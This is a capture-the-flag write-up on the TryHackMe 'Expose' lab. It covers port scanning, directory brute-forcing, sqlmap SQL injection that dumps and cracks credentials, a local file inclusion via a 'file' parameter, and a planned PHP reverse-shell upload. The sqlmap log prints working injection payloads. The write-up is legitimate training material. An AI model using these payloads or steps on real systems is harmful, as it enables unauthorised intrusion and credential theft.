---
title: Expose
difficulty: Easy
platform: THM
tags:
tools:
date: 2026-02-24
---
![](Obsidian%20assets/intro.png)
> [!important]
> Use your red teaming knowledge to pwn a Linux machine.
> 
> _Exposing unnecessary services in a machine can be dangerous. Can you capture the flags and pwn the machine_?
> 
> Target IP: 10.112.181.129
> 
> What is the user flag?

> [!info]
> Okay no guidance given for this one so lets start with enumerating.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap 10.114.173.211    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-24 10:11 EST
Nmap scan report for 10.114.173.211
Host is up (0.024s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain

Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
```
> [!note]
> Ok basic scan reveals 3 open ports but I will do a more aggressive scan to reveal further information like OS scan, version scan and see what domain reveals,

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -A -O -sVC -p- 10.114.173.211
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-24 10:11 EST
Nmap scan report for 10.114.173.211
Host is up (0.023s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE                 VERSION
21/tcp   open  ftp                     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.148.210
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:51:4e:77:d2:84:e9:bd:79:27:f5:bf:8a:9e:4c:f7 (RSA)
|   256 64:09:cc:b3:82:be:b4:99:37:1b:08:75:45:22:c5:f4 (ECDSA)
|_  256 2d:e3:7e:f7:0b:7d:58:8c:46:4f:cb:90:62:d6:ff:e9 (ED25519)
53/tcp   open  domain                  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: EXPOSED
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/messages/sent: 1
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/load/messages/sent/5min: 0.20
|     $SYS/broker/heap/maximum: 49688
|     $SYS/broker/load/sockets/15min: 0.07
|     $SYS/broker/load/messages/sent/1min: 0.76
|     $SYS/broker/load/connections/5min: 0.20
|     $SYS/broker/uptime: 462 seconds
|     $SYS/broker/clients/disconnected: 0
|     $SYS/broker/load/messages/received/1min: 0.76
|     $SYS/broker/store/messages/bytes: 180
|     $SYS/broker/messages/received: 1
|     $SYS/broker/load/connections/15min: 0.07
|     $SYS/broker/bytes/sent: 4
|     $SYS/broker/load/sockets/5min: 0.20
|     $SYS/broker/load/bytes/received/1min: 13.69
|     $SYS/broker/load/bytes/received/15min: 1.18
|     $SYS/broker/load/bytes/sent/1min: 3.04
|     $SYS/broker/load/bytes/received/5min: 3.41
|     $SYS/broker/bytes/received: 18
|     $SYS/broker/clients/active: 0
|     $SYS/broker/load/bytes/sent/15min: 0.27
|     $SYS/broker/clients/connected: 0
|     $SYS/broker/load/sockets/1min: 0.63
|     $SYS/broker/load/messages/sent/15min: 0.07
|     $SYS/broker/load/connections/1min: 0.76
|     $SYS/broker/clients/inactive: 0
|     $SYS/broker/heap/current: 47240
|     $SYS/broker/load/messages/received/15min: 0.07
|     $SYS/broker/load/messages/received/5min: 0.20
|_    $SYS/broker/load/bytes/sent/5min: 0.76
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=2/24%OT=21%CT=1%CU=38079%PV=Y%DS=3%DC=T%G=Y%TM=699DBFD
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=109%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FF%GC
OS:D=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E
OS:8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%
OS:W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   19.79 ms 192.168.128.1
2   ...
3   22.87 ms 10.114.173.211

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.98 seconds
```
> [!note]
> FTP aggressive scanning reveals version vsftpd 2.0.8 with anonymous login allowed so potential attack vector there.
> 
> SSH open port doesn't reveal much useful info but will probably be used to find user.txt
> 
> domain port doesn't reveal much but Gobuster scan can explore the sub-domain for any useful info.
> 
> 1337/tcp open  http Apache httpd 2.4.41 ((Ubuntu)) - This is great as this means there's a webpage to view but not on port 80 but rather 1337 (leet code).
> 
> 1883/tcp open  mosquitto version 1.6.9 - not sure what this relates to but research around this needs to be done. Guessing for now its a DB? there were file paths revealed involving $SYS path
> 
> OS detected is Linux.

> [!info]
>Let's continue with enumeration so lets check out the website for any low hanging fruit and start a Gobuster scan in the background.

![](Obsidian%20assets/Expose%20error.png)
> [!note]
> Am I not viewing the site correctly?
> Quick google search revealed I was attempting a HTTPS connection request when it should be HTTP request

![](Obsidian%20assets/Exposed%20site.png)
![](Obsidian%20assets/Expose%20page%20source.png)
> [!note]
> Nothing obvious here but I have a Gobuster scan running in the background.

```
┌──(kali㉿kali)-[/]
└─$ gobuster dir -u http://10.114.173.211:1337/  -w usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.114.173.211:1337/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 323] [--> http://10.114.173.211:1337/admin/] 
/javascript           (Status: 301) [Size: 328] [--> http://10.114.173.211:1337/javascript/]                      
/phpmyadmin           (Status: 301) [Size: 328] [--> http://10.114.173.211:1337/phpmyadmin/]                      
/server-status        (Status: 403) [Size: 281]
/%d0%9f%d1%80%d0%be%d0%b3%d1%80%d0%b0%d0%bc%d0%bc%d0%bd%d0%be%d0%b5_%d0%be%d0%b1%d0%b5%d1%81%d0%bf%d0%b5%d1%87%d0%b5%d0%bd%d0%b8%d0%b5 (Status: 414) [Size: 361]
/%5bnipponsei%5d%20souten%20no%20ken%20ed%20single%20-%20kokoro%20no%20rhythm%20tobichiru%20butterfly%20%5bdoa%5d (Status: 414) [Size: 361]   
Progress: 207641 / 207641 (100.00%)
===============================================================
Finished
===============================================================
```
> [!note]
> OK, got a couple of 301 redirects which are /admin, /javascript & /phpmyadmin which we can explore and 403 forbidden for /server-status. Let's see what they look like:

![](Obsidian%20assets/Expose-1.png)
![](Obsidian%20assets/Pasted%20image%2020260224154356.png)
![](Obsidian%20assets/Expose%20real%20admin%20site.png)
> [!note]
Ok so only 1 redirect is interesting which is the /phpmyadmin. I'll continue to enumerate.

```
> ftp 10.112.181.129
Connected to 10.112.181.129.
220 Welcome to the Expose Web Challenge.
Name (10.112.181.129:reapz786): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 200 Switching to ASCII mode.
ftp> 200 PORT command successful. Consider using PASV.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,112,181,129,242,130).
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
227 Entering Passive Mode (10,112,181,129,222,207).
150 Here comes the directory listing.
drwxr-xr-x    2 0        121          4096 Jun 11  2023 .
drwxr-xr-x    2 0        121          4096 Jun 11  2023 ..
226 Directory send OK.
ftp> quit
```

> [!note]
> Confirmed nothing interesting to see as anonymous login..

```
1883/tcp open  mosquitto version 1.6.9
```

> [!note]
> Looking online this is an unsecure protocol  called MQTT based on publish/subscribe model hence why I can see the comms from the nmap scan but looking online it seems like DDoS is the main vulnerability which is not what I'm here for.
> 
> Ill probe the phpmyadmin now...

![](Obsidian%20assets/Exposephpmyadmin%20admin%20login.png)

![](Obsidian%20assets/Exposerandomuserlogin.png)

> [!note]
> OK, confirmed its a MySQL server the information is coming from so now what? How can we exploit this further?

![](Obsidian%20assets/Exposelogin%20question.png)
![](Obsidian%20assets/Exposephpmyadmindocs.png)
> [!note]
> OK, getting somewhere with the version number which is 4.9.5 so lets hunt for a CVE???

![](Obsidian%20assets/Exposerootlogin.png)
> [!note]
> Tried default creds and got denied!

```
 ~                                                                               at 15:57:46
> gobuster dir -u http://10.112.163.38:1337/  -w /usr/share/wordlists/SecLists/Discovery/Web-C
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.163.38:1337/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
javascript           (Status: 301) [Size: 326] [--> http://10.112.163.38:1337/javascript/]
phpmyadmin           (Status: 301) [Size: 326] [--> http://10.112.163.38:1337/phpmyadmin/]
admin                (Status: 301) [Size: 321] [--> http://10.112.163.38:1337/admin/]
server-status        (Status: 403) [Size: 280]
admin_101            (Status: 301) [Size: 325] [--> http://10.112.163.38:1337/admin_101/]
Progress: 29999 / 29999 (100.00%)
===============================================================
Finished
===============================================================
```

> [!note]
> Had to go back to Gobuster as I was using the wrong word list and found another dir which is admin_101

![](Obsidian%20assets/Exposeadmin_101.png)

> [!info]
>Had to learn how to use sqlmap which led down an interesting path alongside burpsuite.
>Essentially I used Burpsuite to capture the request and extract that all into a text file and use the following into sqlmap:

```
 ~                                                                               at 16:55:22
> sqlmap -r /home/reapz786/Downloads/THM\ rooms/exposeadmin.txt --dump                                ___
       __H__
 ___ ___[.]_____ ___ ___  {1.10.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:20:22 /2026-03-01/

[17:20:22] [INFO] parsing HTTP request from '/home/reapz786/Downloads/THM rooms/exposeadmin.txt'
[17:20:22] [INFO] testing connection to the target URL
[17:20:22] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:20:22] [WARNING] request URI is marked as too long by the target. you are advised to try a switch '--no-cast' and/or '--no-escape'
[17:20:22] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
are you sure that you want to continue with further target testing? [Y/n] Y
[17:20:33] [WARNING] please consider usage of tamper scripts (option '--tamper')
[17:20:33] [INFO] testing if the target URL content is stable
[17:20:33] [INFO] target URL content is stable
[17:20:33] [INFO] testing if POST parameter 'email' is dynamic
[17:20:33] [INFO] POST parameter 'email' appears to be dynamic
[17:20:33] [INFO] heuristic (basic) test shows that POST parameter 'email' might be injectable (possible DBMS: 'MySQL')
[17:20:33] [INFO] heuristic (XSS) test shows that POST parameter 'email' might be vulnerable to cross-site scripting (XSS) attacks
[17:20:33] [INFO] testing for SQL injection on POST parameter 'email'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[17:20:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:20:48] [WARNING] reflective value(s) found and filtering out
[17:20:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[17:20:49] [INFO] testing 'Generic inline queries'
[17:20:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[17:20:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[17:20:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[17:20:52] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[17:20:54] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[17:20:56] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[17:20:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[17:21:00] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[17:21:02] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:21:02] [INFO] POST parameter 'email' appears to be 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
[17:21:02] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:21:02] [INFO] POST parameter 'email' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
[17:21:02] [INFO] testing 'MySQL inline queries'
[17:21:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[17:21:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[17:21:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[17:21:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[17:21:03] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[17:21:03] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[17:21:03] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:21:13] [INFO] POST parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[17:21:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:21:13] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[17:21:13] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:21:13] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:21:13] [INFO] target URL appears to have 4 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[17:21:38] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[17:21:39] [INFO] target URL appears to be UNION injectable with 4 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[17:21:41] [INFO] testing 'MySQL UNION query (17) - 21 to 40 columns'
[17:21:42] [INFO] testing 'MySQL UNION query (17) - 41 to 60 columns'
[17:21:42] [INFO] testing 'MySQL UNION query (17) - 61 to 80 columns'
[17:21:43] [INFO] testing 'MySQL UNION query (17) - 81 to 100 columns'
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 698 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: email=hacker@root.thm' AND EXTRACTVALUE(2972,CASE WHEN (2972=2972) THEN 2972 ELSE 0x3A END)-- ICPT&password=root

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: email=hacker@root.thm' AND EXTRACTVALUE(7204,CONCAT(0x5c,0x71706a7671,(SELECT (ELT(7204=7204,1))),0x71717a6b71))-- ygjM&password=root

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=hacker@root.thm' AND (SELECT 3836 FROM (SELECT(SLEEP(5)))TTwN)-- eGGa&password=root
---
[17:21:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.1
[17:21:49] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[17:21:49] [INFO] fetching current database
[17:21:49] [INFO] retrieved: 'expose'
[17:21:49] [INFO] fetching tables for database: 'expose'
[17:21:49] [INFO] retrieved: 'config'
[17:21:49] [INFO] retrieved: 'user'
[17:21:49] [INFO] fetching columns for table 'user' in database 'expose'
[17:21:49] [INFO] retrieved: 'id'
[17:21:49] [INFO] retrieved: 'int'
[17:21:49] [INFO] retrieved: 'email'
[17:21:49] [INFO] retrieved: 'varchar(512)'
[17:21:49] [INFO] retrieved: 'password'
[17:21:49] [INFO] retrieved: 'varchar(512)'
[17:21:49] [INFO] retrieved: 'created'
[17:21:49] [INFO] retrieved: 'timestamp'
[17:21:49] [INFO] fetching entries for table 'user' in database 'expose'
[17:21:49] [INFO] retrieved: '2023-02-21 09:05:46'
[17:21:49] [INFO] retrieved: 'hacker@root.thm'
[17:21:49] [INFO] retrieved: '1'
[17:21:49] [INFO] retrieved: 'VeryDifficultPassword!!#@#@!#!@#1231'
Database: expose
Table: user
[1 entry]
+----+-----------------+---------------------+--------------------------------------+
| id | email           | created             | password                             |
+----+-----------------+---------------------+--------------------------------------+
| 1  | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 |
+----+-----------------+---------------------+--------------------------------------+

[17:21:49] [INFO] table 'expose.`user`' dumped to CSV file '/home/reapz786/.local/share/sqlmap/output/10.112.163.38/dump/expose/user.csv'
[17:21:49] [INFO] fetching columns for table 'config' in database 'expose'
[17:21:49] [INFO] retrieved: 'id'
[17:21:49] [INFO] retrieved: 'int'
[17:21:49] [INFO] retrieved: 'url'
[17:21:49] [INFO] retrieved: 'text'
[17:21:49] [INFO] retrieved: 'password'
[17:21:49] [INFO] retrieved: 'text'
[17:21:49] [INFO] fetching entries for table 'config' in database 'expose'
[17:21:50] [INFO] retrieved: '/file1010111/index.php'
[17:21:50] [INFO] retrieved: '1'
[17:21:50] [INFO] retrieved: '69c66901194a6486176e81f5945b8929'
[17:21:50] [INFO] retrieved: '/upload-cv00101011/index.php'
[17:21:50] [INFO] retrieved: '3'
[17:21:50] [INFO] retrieved: '// ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z'
[17:21:50] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[17:22:39] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/opt/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[17:23:00] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[17:23:03] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[17:23:03] [INFO] starting 12 processes
[17:23:05] [INFO] cracked password 'easytohack' for hash '69c66901194a6486176e81f5945b8929'
Database: expose
Table: config
[2 entries]
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
+----+------------------------------+-----------------------------------------------------+

[17:23:08] [INFO] table 'expose.config' dumped to CSV file '/home/reapz786/.local/share/sqlmap/output/10.112.163.38/dump/expose/config.csv'
[17:23:08] [WARNING] HTTP error codes detected during run:
414 (URI Too Long) - 1 times
[17:23:08] [INFO] fetched data logged to text files under '/home/reapz786/.local/share/sqlmap/output/10.112.163.38'

[*] ending @ 17:23:08 /2026-03-01/
```

> [!note]
> which led to the following URL with the password easytohack

![](Obsidian%20assets/Exposeeasytohack.png)

![](Obsidian%20assets/Exposefuzzing.png)

> [!info]
> Need to find out what parameter fuzzing and DOM elements are but in the meantime lets try the other url /upload-cv00101011/index.php

![](Obsidian%20assets/ExposeZ.png)

> [!note]
> OK so going back to the above image, I inspected the DOM elements to find this:
```
<span style="display: none;">Hint: Try file or view as GET parameters?</span>
```

> [!note]
> I changed URL into a GET parameter by a ? and then file/view to test the response
> which led to a LFI and so I used directory traversal to find the username that starts with Z

```
http://10.112.163.38:1337/file1010111/index.php?file=test
```

![](Obsidian%20assets/ExposeZe4amkish.png)

> [!note]
> Bit hard to tell but theres a user called ZeamKish

![](Obsidian%20assets/Exposerevverseshell.png)

> [!note]
> Went back to /upload-cv00101011/index.php and entered zeamkish for a file upload to do a PHP reverse shell but its only letting me upload image files like jpg/png



